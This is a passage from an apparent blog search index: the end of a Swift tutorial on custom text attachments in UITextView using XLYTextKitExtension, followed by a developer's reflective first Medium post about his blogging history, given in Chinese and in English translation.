difficult. Moreover, time was running out, so I aimlessly searched GitHub for alternative solutions.Eventually, I found XLYTextKitExtension, which can be directly integrated into the code.✔ It allows NSTextAttachment to support custom UIView, enabling any interactive operations.✔ NSTextAttachment can be reused without overwhelming memory.The implementation is quite similar to Chapter One, except that instead of using NSTextAttachment, we now use XLYTextAttachment.For the UITextView you want to use:contentTextView.setUseXLYLayoutManager()Tip 1: Change the insertion of NSTextAttachment to:let combine = NSMutableAttributedString(attributedString: NSAttributedString(string: \"\"))let imageView = UIView() // your custom viewlet imageAttachment = XLYTextAttachment { () -&gt; UIView in return imageView}imageAttachment.id = idimageAttachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height)combine.append(NSAttributedString(attachment: imageAttachment))self.contentTextView.textStorage.insert(combine, at: range)Tip 2: Change the search for NSTextAttachment to:self.contentTextView.textStorage.enumerateAttribute(NSAttributedString.Key.attachment, in: NSRange(location: 0, length: self.contentTextView.textStorage.length), options: []) { (value, range, stop) in if let attachment = value as? XLYTextAttachment { // attachment.id }}Tip 3: Change the deletion of NSTextAttachment items to:self.contentTextView.textStorage.deleteCharacters(in: range)Tip 4: Get the current content length:self.contentTextView.textStorage.lengthTip 5: Refresh the bounds size of the attachment.The main reason is for user experience; when inserting images, I first place a loading image, and the inserted image is replaced after being compressed in the background. I need to update the TextAttachment bounds to the resized size:self.contentTextView.textStorage.addAttributes([:], range: range)(Adding an empty attribute to trigger a refresh).Tip 6: Convert input content into a transmittable format.Use Tip 2 to search through all input content and extract the IDs of the found attachments, combining them into a format like [[ID]] for transmission.Tip 7: Content replacement:self.contentTextView.textStorage.replaceCharacters(in: range, with: NSAttributedString(attachment: newImageAttachment))Tip 8: Use regular expressions to match the range of the content:let pattern = \"(\\\\[\\\\[image_id=){1}([0-9]+){1}(\\\\]\\\\]){1}\"let textStorage = self.contentTextView.textStorageif let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) { while true { let range = NSRange(location: 0, length: textStorage.length) if let match = regex.matches(in: textStorage.string, options: .withTransparentBounds, range: range).first { let matchString = textStorage.attributedSubstring(from: match.range) // FOUND! } else { break } }}Note: If you want to search and replace items, you need to use a while loop; otherwise, when there are multiple search results, finding and replacing the first one will cause the range of subsequent search results to be incorrect, leading to a crash.ConclusionI have successfully completed the product using this method, and it is now online without any issues encountered so far. I’ll take some time to further explore the underlying principles!This article is more of a personal reflection on problem-solving rather than a tutorial. If you’re working on similar functionality, I hope you find it helpful. Feel free to reach out if you have any questions or feedback. The official first post on MediumFurther Reading ZMarkupParser: A Tool for Converting HTML Strings to NSAttributedString The Challenges of Building a Custom HTML ParserIf you have any questions or feedback, please contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,090 Total Views Last Statistics Date: 2025-08-15 | 1,003 Views on Medium." }, { "title": "Medium的第一篇", "url": "/posts/zrealm-life/medium%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87-b7a3fb3d5531/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, 生活, medium", "date": "2018-10-06 12:53:36 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.萬事起頭難已經超過4年沒有在經營Blog，之前的廣告收益尾款US$88就這樣一直卡著，最近發現可以主動要求取消Adsense帳戶，只要達到最低給付額度Google就會把最後一筆收益給你；這也算是給了我一個動力再回來寫Blog．...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.萬事起頭難已經超過4年沒有在經營Blog，之前的廣告收益尾款US$88就這樣一直卡著，最近發現可以主動要求取消Adsense帳戶，只要達到最低給付額度Google就會把最後一筆收益給你；這也算是給了我一個動力再回來寫Blog．初來乍到，就用“萬事起頭難” 這個簡單的標題當作開端回想起寫Blog的歷史，大約是在國中正值最瘋遊戲的時期，那時候家中電腦很爛基本沒什麼遊戲可以玩，但在那個貪玩的年紀，就算沒遊戲可以打還是要每天打開電腦，對那時候的我來說就已經很新鮮了．由於以上因素，所以大部分用電腦的時間我都在用即時通跟同學喇賽、逛逛網頁；可想而知，其實很空洞又缺乏成就感(至少別人玩遊戲還能獲得成就感)而就在那時”Blog”正值興盛時期這個對我來說非常的新鮮；而第一個接觸的當然就是紅極一時的無名小站，當我辦好帳號第一次打開Blog的那個時刻心情就是「哇！有自己的網站」、「哇！還可以換樣式好酷」；剛好學校電腦課有教網頁設計(Front-Page 2003/ 阿聖網站 )，所以第一個Blog都在研究功能上的項目；找素材、玩樣式跟裝很多很“夏趴”的JavaScript外掛，反觀內容質量部分基本上都是廢文．這讓當時對網路世界懵懂無知的我有了更深入的認識，例如：如何找資料?、外掛裝上去壞掉怎麼解決?、圖片怎麼嵌入?….等等其中有許多資料都是由論壇取得，當時也是”論壇”的興盛時期，但我就是標準的潛水客只看不發，偶爾回個文「感謝大大無私分享」；在逛各大論壇的時候發現有”免費論壇”這種東西，申請就能當站長有自己的論壇，Level相比Blog又更高一層了，這次是“站長”、“站長”、“站長” 好酷！！結合之前玩轉Blog設定的基礎，論壇可以玩的設定又多更多(開版/會員權限/插件中心) 什麼都可以自己設定，宛如進入到另一個世界免費論壇系統有很多家；當中一直換來換去不斷的嘗試，有的是功能不完全、有的是不自由、有的不穩定、有的廣告太干擾，最後比較有印象的是 Marlito ，最符合我的需求，也在上面經營得最久．與此同時，Blog也搬家到” 優仕網部落格 ”；起因是無名開始限制東限制西，優仕網那時候剛起步，先來先贏、限制少、功能符合需求，這次有在經營文章內容，7成在分享我覺得好用的程式(類似阿榮福利味)另外3成是玩論壇的經驗分享(設定/BUG處理)文章總數大約30篇，瀏覽量一天約200人/最高500人(現在看來沒什麼)、優仕網部落格排行榜前10名，流量幾乎都來在分享好用程式的文章；認真經營了一年多，再來遇到國三忙課業、上高中，一路斷斷續續，之後又參加選手培訓就放著養蚊子了。由於Blog名稱太中二，只放上瀏覽數截圖之後又再創了一個 Blogger 都是技術面的文章紀錄寫程式遇到的問題跟解決方法；但Blogger不好用，基本功能都無法滿足，寫了幾篇就放棄了後期自己申請網域跟買空間架了一個WordPress Blog，但什麼都要自己來、設定、調整功能…我無法專注在寫內容這件事上ㄧ樣是斷斷續續在寫，空間到期後就不續約網站直接下線直到現在。總結，一路走來從對Blog這個東西感到很新鮮-&gt;到-&gt;研究玩轉Blog的功能-&gt;到-&gt;開始專注Blog本質-文章內容-&gt;到-&gt;分享技術型文章懶了、少了紀錄過程及回頭檢視和分享出來、嘗過廣告收益的甜頭，漸漸地離初衷越來越遠，單純熱心想要與大家分享的那顆心https://www.flickr.com/photos/zuvonne/3738631215給自己一個新目標，教學相長為初衷，開始重新紀錄生活！ 技術面的：iOS App開發,Swift,PHP,Mysql… 生活面的：工作、攝影、開箱、Murmur有的沒的 經驗面的：最近在碰機器學習，從0開始的過程 故事面的：技能競賽經歷、生活觀察 本文同步發表於個人 Blog： [點我前往] 。 有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 288 Total Views Last Statistics Date: 2025-08-15 | 225 Views on Medium." }, { "title": "My First Post on Medium", "url": "/posts/zrealm-life/en/my-first-post-on-medium-b7a3fb3d5531/", "categories": "ZRealm Life.", "tags": "blog, blogger, developer, life, medium", "date": "2018-10-06 12:53:36 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Starting is Always the Hardest PartIt has been over 4 years since I last managed a b...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Starting is Always the Hardest PartIt has been over 4 years since I last managed a blog. My previous ad revenue of US$88 has been stuck for a long time. Recently, I discovered that I could actively request to cancel my Adsense account, and as long as I reach the minimum payout threshold, Google will send me the final payment; this has motivated me to return to blogging.As a newcomer, I’ll start with the simple title “Starting is Always the Hardest Part.”Looking back at my blogging history, it began during my middle school years when I was obsessed with games. At that time, my family’s computer was quite poor, and there weren’t many games to play. However, even without games, I would still open the computer every day, which felt fresh and exciting for me back then.Due to these factors, most of my computer time was spent chatting with classmates on instant messaging and browsing websites. As you can imagine, it was quite empty and lacked a sense of achievement (at least others playing games could feel a sense of accomplishment).During that time, “blogs” were very popular, and it was something new for me. The first platform I encountered was the once-popular Wretch. When I created my account and opened my blog for the first time, I felt, “Wow! I have my own website,” and “Wow! I can change the style, how cool!” Coincidentally, my school’s computer class taught web design (Front-Page 2003/ 阿聖網站), so my first blog was focused on exploring its features; I searched for materials, played with styles, and installed many flashy JavaScript plugins, while the content quality was mostly just filler.This experience gave me a deeper understanding of the online world, such as: how to find information, how to fix broken plugins, how to embed images, etc.Many of the resources I found were from forums, which were also thriving at that time. However, I was a typical lurker, just reading without posting, occasionally commenting, “Thank you for your generous sharing.” While browsing various forums, I discovered the concept of “free forums,” where you could apply to be the administrator and have your own forum. This felt like a step up from blogging; being a “forum admin” was so cool!With the foundation I built from playing around with blog settings, forums offered even more customizable options (board creation/member permissions/plugin centers). Everything could be set up by myself, as if I had entered another world.There were many free forum systems available; I kept switching and trying different ones. Some had incomplete features, some were restrictive, some were unstable, and some had too many intrusive ads. Eventually, I found Marlito, which best met my needs, and I managed it for the longest time.At the same time, my blog moved to “優仕網部落格.” The reason was that Wretch started imposing various restrictions, while 優仕網 was just starting out, had fewer limitations, and offered features that met my needs. This time, I focused on the content of my articles, with 70% sharing useful programs (similar to 阿榮福利味) and the remaining 30% sharing my experiences with the forum (settings/bug fixes).I wrote about 30 articles, with daily views of around 200 people, peaking at 500 (which seems insignificant now). My blog ranked in the top 10 on 優仕網, with most traffic coming from articles sharing useful programs. After seriously managing it for over a year, I encountered a busy academic schedule in my third year of middle school and then high school, leading to an on-and-off writing pattern. Later, I participated in training for competitors, and my blog was left unattended.Since the blog name was too cringy, I only included a screenshot of the view count.Later, I created another Blogger account to document technical articles about problems I encountered while programming and their solutions. However, Blogger was not user-friendly, and its basic features were insufficient, so I gave up after writing a few posts.In the later stages, I applied for my own domain and purchased hosting to set up a WordPress blog, but I had to handle everything myself—settings, adjustments, functionalities… I couldn’t focus on writing content, and it ended up being sporadic. When the hosting expired, I didn’t renew it, and the website went offline until now.In summary, my journey has gone from finding blogging fresh—&gt; to exploring and mastering blog features—&gt; to focusing on the essence of blogging—&gt; to sharing technical articles.I became lazy, recorded less of the process, and failed to reflect and share. After tasting the sweetness of ad revenue, I gradually drifted further away from my original intention, which was simply to share with everyone.https://www.flickr.com/photos/zuvonne/3738631215Setting a New Goal for Myself: Teaching and Learning as My Original Intention, Starting to Record Life Again! Technical: iOS App Development, Swift, PHP, MySQL… Life: Work, Photography, Unboxing, Murmurs about various topics Experience: Recently getting into machine learning, starting from scratch Stories: Experiences in skill competitions, observations of life This article is also published on my personal blog: [Click here to visit]. If you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 288 Total Views Last Statistics Date: 2025-08-15 | 225 Views on Medium." } ]
